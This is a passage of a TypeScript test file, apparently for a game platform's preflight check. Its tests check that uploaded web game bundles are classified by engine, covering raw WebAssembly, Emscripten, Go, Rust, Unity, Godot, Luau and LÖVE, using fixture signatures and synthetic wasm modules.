  return new Uint8Array(out);
}
const SIGNATURES = JSON.parse(readFileSync(new URL('./fixtures/engine-signatures.json', import.meta.url), 'utf8')) as
  { id: string; path: string; text: string; paths: string[]; kind: string; wasm?: { path: string; base64: string }[] }[];
const sample = (id: string, test: (row: typeof SIGNATURES[number]) => boolean = () => true) => SIGNATURES.find((row) => row.id === id && test(row))!;
const RAW_PAGE = '<!doctype html><canvas id="c"></canvas><script type="module" src="./main.js"></script>';
const RAW_LOADER = 'const { instance } = await WebAssembly.instantiateStreaming(fetch("game.wasm"), { env: { draw } });\ninstance.exports.start();';
const RAW_MODULE = wasmWith({ imports: ['draw'] });
/** detectEngine over a page, its scripts and its modules, read completely unless told otherwise. */
async function detected(scripts: Record<string, string>, modules: Record<string, Uint8Array>, extra: string[] = [], complete = true) {
  const { detectEngine, wasmModule } = await import('../src/engines');
  const sources = Object.entries({ 'index.html': RAW_PAGE, ...scripts }).map(([path, text]) => ({ path, text }));
  return detectEngine([...sources.map((s) => s.path), ...Object.keys(modules), ...extra], sources,
    { complete, wasm: Object.entries(modules).map(([path, bytes]) => wasmModule(path, bytes)) });
}

test('a page that instantiates a module it names, with nothing else recognised, is raw WebAssembly', async () => {
  const result = await preflight([file('index.html', RAW_PAGE), file('main.js', RAW_LOADER), module('game.wasm', RAW_MODULE)]);
  assert.equal(result.engine?.id, 'webassembly', JSON.stringify(result.engine));
  assert.equal(result.engine?.name, 'WebAssembly');
  assert.equal(result.engine?.version, null);
  assert.deepEqual(result.engine?.also, []);
  assert.equal(result.engine?.evidence, 'game.wasm, loaded by WebAssembly.instantiateStreaming in main.js');
  // The synchronous pair, and a hashed, precompressed module the page names without its suffix.
  const sync = await detected({ 'main.js': 'const m=new WebAssembly.Module(bytes),i=new WebAssembly.Instance(m,{});fetch("assets/game-Ab12.wasm")' },
    { 'assets/game-Ab12.wasm.br': RAW_MODULE });
  assert.equal(sync.id, 'webassembly');
  assert.equal((await detected({ 'main.js': 'WebAssembly.compileStreaming(fetch("./zig-out/bin/game.wasm"))' }, { 'zig-out/bin/game.wasm': wasmWith() })).id, 'webassembly');
});

/* fixtures/assemblyscript-raw is a real raw build: game.js and game.wasm are exactly what
   AssemblyScript 0.28.9 wrote on 4 Nov 2026 for `asc game.ts --outFile game.wasm --bindings
   esm --optimize`, from four lines that import `draw` from env and export `tick`. The page
   is hand-written. The glue compiles the module with WebAssembly.compileStreaming and names
   no toolchain, which is what raw WebAssembly means here. */
test('a real AssemblyScript build is raw WebAssembly and passes clean', async () => {
  const root = fileURLToPath(new URL('./fixtures/assemblyscript-raw/', import.meta.url));
  const files = walk(root).map((full) => ({ path: relative(root, full).split(sep).join('/'), size: statSync(full).size,
    text: async () => readFileSync(full, 'utf8'), bytes: async () => new Uint8Array(readFileSync(full)) }));
  const result = await platformPreflight(files);
  assert.equal(result.engine?.id, 'webassembly', JSON.stringify(result.engine));
  assert.equal(result.engine?.evidence, 'game.wasm, loaded by WebAssembly.instantiate in game.js');
  assert.equal(result.ok, true, JSON.stringify(result.findings));
  assert.deepEqual(codes(result, 'warning'), []);
});

test('raw WebAssembly loses to every engine that is recognised, and is never reported beside one', async () => {
  const cases: [string, Record<string, string>, Record<string, Uint8Array>, string[]][] = [
    ['threejs', { 'main.js': `${THREE}\n${RAW_LOADER}` }, { 'game.wasm': RAW_MODULE }, []],
    ['unity', { 'Build/game.loader.js': `function createUnityInstance(){}\n${RAW_LOADER}` }, { 'Build/game.wasm': RAW_MODULE }, ['Build/game.data']],
    ['godot', { 'index.js': `const GODOT_CONFIG = {}; const GodotFS = {};\n${RAW_LOADER}` }, { 'index.wasm': RAW_MODULE }, ['index.pck']],
    ['emscripten', { 'main.js': `${sample('emscripten').text}\n${RAW_LOADER}` }, { 'game.wasm': RAW_MODULE }, []],
    ['go', { 'wasm_exec.js': sample('go').text, 'main.js': RAW_LOADER }, { 'game.wasm': RAW_MODULE }, []],
    ['rust', { 'main.js': `${sample('rust').text}\n${RAW_LOADER}` }, { 'game.wasm': RAW_MODULE }, []],
    ['kaigen', { 'main_worker.js': `${KAIGEN.text}\n${RAW_LOADER}` }, { 'game.wasm': KAIGEN_WASM }, []],
  ];
  for (const [id, scripts, modules, extra] of cases) {
    const report = await detected(scripts, modules, extra);
    assert.equal(report.id, id, JSON.stringify(report));
    assert.ok(!report.also.some((engine) => engine.id === 'webassembly'), id);
  }
});

/* Each of these is a toolchain the registry recognises only in part: its full signature is
   missing, and what is left still names it. Calling them raw would be a confident wrong
   answer, so they stay custom, which is what they were before raw WebAssembly had a name. */
test('glue or a module that names a toolchain keeps a bundle custom, not raw WebAssembly', async () => {
  const glue = [
    'var wasmBinaryFile="game.wasm";function instantiateArrayBuffer(b,i){return WebAssembly.instantiate(b,i)}',
    `err(\`failed to asynchronously prepare wasm: \${reason}\`);${RAW_LOADER}`,
    '// This emscripten-generated code\nWebAssembly.instantiateStreaming(fetch("game.wasm"),info)',
    `imports.wbg.__wbg_log_1=function(){};${RAW_LOADER}`,
    `const go=new Go();WebAssembly.instantiateStreaming(fetch("game.wasm"),go.importObject)`,
    `const j={"syscall/js.valueGet":()=>{}};${RAW_LOADER}`,
    `createUnityInstance(c,{});${RAW_LOADER}`, `const GODOT_CONFIG={};${RAW_LOADER}`, `var EngineLoader={};${RAW_LOADER}`,
    `WebAssembly.Module.customSections(m,"hz_flags");${RAW_LOADER}`,
  ];
  for (const text of glue) assert.equal((await detected({ 'main.js': text }, { 'game.wasm': RAW_MODULE })).id, 'custom', text);
  for (const name of ['emscripten_resize_heap', '_emscripten_memcpy_js', '__syscall_openat', 'invoke_vii', '__wbg_log_1', '__wbindgen_throw', 'runtime.wasmExit', 'syscall/js.valueGet']) {
    assert.equal((await detected({ 'main.js': RAW_LOADER }, { 'game.wasm': wasmWith({ imports: ['draw', name] }) })).id, 'custom', name);
  }
  // Kaigen's section, or an engine's licence stamp alone, in a module whose glue says nothing.
  assert.equal((await detected({ 'main.js': RAW_LOADER }, { 'game.wasm': wasmWith({ custom: [['hz_flags', '']] }) })).id, 'custom');
  assert.equal((await detected({ 'main.js': RAW_LOADER }, { 'game.wasm': wasmWith({ imports: ['draw'], custom: [['notes', 'HZLICSTAMP1|SYNTHETIC']] }) })).id, 'custom');
  // Glue read from a precompressed script is glue all the same.
  assert.equal((await detected({ 'main.js': RAW_LOADER, 'glue.js.br': 'var wasmBinaryFile="other.wasm";' }, { 'game.wasm': RAW_MODULE })).id, 'custom');
  const stamped = await preflight([file('index.html', RAW_PAGE), file('main.js', RAW_LOADER), module('game.wasm', KAIGEN_WASM)]);
  assert.equal(stamped.engine?.id, 'custom');
  assert.deepEqual(stamped.engine?.licences, ['kaigen']);
});

test('a module the page does not name, bytes that are not a module, or an unread script is not raw WebAssembly', async () => {
  assert.equal((await detected({ 'main.js': RAW_LOADER.replace('game.wasm', 'level.wasm') }, { 'game.wasm': RAW_MODULE })).id, 'custom');
  assert.equal((await detected({ 'main.js': RAW_LOADER.replace('game.wasm', 'my_game.wasm') }, { 'game.wasm': RAW_MODULE })).id, 'custom', 'my_game.wasm does not name game.wasm');
  assert.equal((await detected({ 'main.js': RAW_LOADER }, { 'game.wasm': new TextEncoder().encode('not a module') })).id, 'custom');
  assert.equal((await detected({ 'main.js': RAW_LOADER }, { 'game.wasm': new Uint8Array([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0, 2, 9]) })).id, 'custom', 'a module cut short');
  assert.equal((await detected({ 'main.js': 'const memory = new WebAssembly.Memory({ initial: 1 }); fetch("game.wasm")' }, { 'game.wasm': RAW_MODULE })).id, 'custom', 'no module compiled');
  assert.equal((await detected({ 'NOTES.md': RAW_LOADER, 'main.js': 'fetch("game.wasm")' }, { 'game.wasm': RAW_MODULE })).id, 'custom', 'the call is not in a page script');
  const partial = await detected({ 'main.js': RAW_LOADER }, { 'game.wasm': RAW_MODULE }, [], false);
  assert.equal(partial.id, 'custom');
  assert.match(partial.evidence, /incomplete/);
});

test('a validated SWF or jsdos payload replaces raw WebAssembly rather than standing beside it', async () => {
  const { withRawRuntimeEvidence } = await import('../src/engines');
  const raw = await detected({ 'main.js': RAW_LOADER }, { 'game.wasm': RAW_MODULE });
  const receipt = { engine: 'ruffle' as const, format: 'swf' as const, path: 'movie.swf', sha256: 'a'.repeat(64), bytes: 8, expandedBytes: 8, memberCount: 1, complete: true, manualReviewRequired: false };
  const merged = withRawRuntimeEvidence(raw, [receipt]);
  assert.equal(merged.id, 'ruffle');
  assert.deepEqual(merged.also, []);
  assert.equal(withRawRuntimeEvidence(raw, []).id, 'webassembly');
});

/* Luau's VM carries two messages no other Lua does (VM/src/lvmload.cpp, VM/src/ldebug.cpp).
   The module samples are synthetic: a header and one custom section holding the two
   messages copied from @luau-rs/luau 0.739.0's 3 MB module, as Bevy's are. */
test('Luau is named from its VM messages, in its module or in a single-file build, ahead of the Rust glue around it', async () => {
  const { detectEngine, wasmModule } = await import('../src/engines');
  const bindgen = sample('luau', (row) => Boolean(row.wasm));
  const modules = bindgen.wasm!.map((row) => wasmModule(row.path, new Uint8Array(Buffer.from(row.base64, 'base64'))));
  const named = detectEngine([bindgen.path, ...bindgen.paths], [bindgen], { complete: true, wasm: modules });
  assert.equal(named.id, 'luau');
  assert.deepEqual(named.also.map((engine) => engine.id), ['rust']);
  assert.match(named.evidence, /assets\/luau_wasm_bg\.wasm$/);
  const single = sample('luau', (row) => !row.wasm);
  assert.equal(detectEngine([single.path], [single], { complete: true }).id, 'luau');
  // wasmoon's Lua 5.4 and LÖVE's Lua stay themselves: neither carries the two messages.
  assert.equal(detectEngine(['index.js'], [sample('wasmoon')], { complete: true }).id, 'wasmoon');
  assert.equal(detectEngine(['love.js'], [sample('love2d', (row) => row.kind === 'exported-game-runtime')], { complete: true }).id, 'love2d');
});

test('one VM message, the messages outside a module, or no loader is not Luau', async () => {
  const bindgen = sample('luau', (row) => Boolean(row.wasm));
  const glue = { 'assets/luau_wasm.js': bindgen.text };
  const one = await detected(glue, { 'assets/luau_wasm_bg.wasm': wasmWith({ custom: [['strings', 'attempt to modify a readonly table']] }) });
  assert.equal(one.id, 'rust', 'one message is not the VM');
  const words = new TextEncoder().encode('%s: bytecode version mismatch (expected [%d..%d], got %d) attempt to modify a readonly table');
  assert.equal((await detected(glue, { 'assets/luau_wasm_bg.wasm': words })).id, 'rust', 'the messages in bytes that are not a module');
  const single = sample('luau', (row) => !row.wasm);
  const unloaded = single.text.replace(/WebAssembly\.instantiate/g, 'Assembled.instantiate');
  assert.notEqual((await detected({ 'Luau.Web.js': unloaded }, {})).id, 'luau', 'the messages with nothing that loads a module');
});

/* The real exports, when somebody points at them: OPENGAME_LOVEJS_EXPORT=<folder>, either
   one export or a folder of them. Built on 4 Nov 2026 by love.js 11.4.1 from
   scripts/engine-fixtures/native/lovejs, compat and threaded, both named LÖVE. */
test('real love.js exports are LÖVE', { skip: !process.env.OPENGAME_LOVEJS_EXPORT && 'set OPENGAME_LOVEJS_EXPORT to a love.js export or a folder of them' }, async () => {
  const top = process.env.OPENGAME_LOVEJS_EXPORT!;
  const roots = existsSync(join(top, 'love.js')) ? [top] : readdirSync(top).map((name) => join(top, name)).filter((dir) => existsSync(join(dir, 'love.js')));
  assert.ok(roots.length > 0, `no love.js export under ${top}`);
  for (const root of roots) {
    const files = walk(root).map((full) => ({ path: relative(root, full).split(sep).join('/'), size: statSync(full).size,
      text: async () => readFileSync(full, 'utf8'), bytes: async () => new Uint8Array(readFileSync(full)) }));
    const result = await platformPreflight(files);
    assert.equal(result.engine?.id, 'love2d', `${root}: ${JSON.stringify(result.engine)}`);
    assert.ok(!result.engine?.also.some((engine) => engine.id === 'webassembly'), root);
  }
});
